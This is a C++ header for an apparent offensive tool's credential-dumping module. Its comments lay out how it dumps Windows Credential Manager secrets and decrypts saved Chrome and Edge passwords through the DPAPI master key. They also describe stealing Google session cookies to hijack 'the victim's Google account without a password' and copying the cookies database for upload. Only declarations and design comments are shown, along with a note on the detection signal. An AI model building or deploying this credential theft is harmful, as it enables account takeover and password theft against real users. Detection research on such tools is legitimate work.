#pragma once
#ifndef CRED_DUMP_H
#define CRED_DUMP_H
#include "common.h"

namespace CredDump {
    // Enumerate Windows Credential Manager (Generic + Domain passwords).
    std::string CredMan();

    // Extract Chrome / Edge saved logins.
    // Reads Local State for the DPAPI-protected AES-256 master key,
    // copies Login Data (SQLite), then decrypts each password_value:
    //   - v10 prefix  → AES-256-GCM using the master key (Chrome 80+)
    //   - no prefix   → direct CryptUnprotectData (Chrome < 80)
    std::string Chrome();

    // Extract Chrome session cookies for Google accounts.
    // Uses the same master key mechanism as Chrome(). Scans the Cookies SQLite
    // for known Google cookie names (SID, SSID, __Secure-1PSID, etc.) and
    // decrypts the encrypted_value blobs. The returned cookies can be imported
    // into a browser to access the victim's Google account without a password.
    // Detection signal: non-browser process reading Default\Network\Cookies +
    //   DPAPI call for master key + BCryptDecrypt on cookie blobs.
    std::string ChromeCookies();

    // Copy the raw Cookies database to a temp file and return its path.
    // Caller must delete the file after uploading. Returns empty on failure.
    // Used by `creddump cookiesdb` to upload the raw DB for offline analysis.
    std::string ChromeCookiesDbPath();
}

#endif
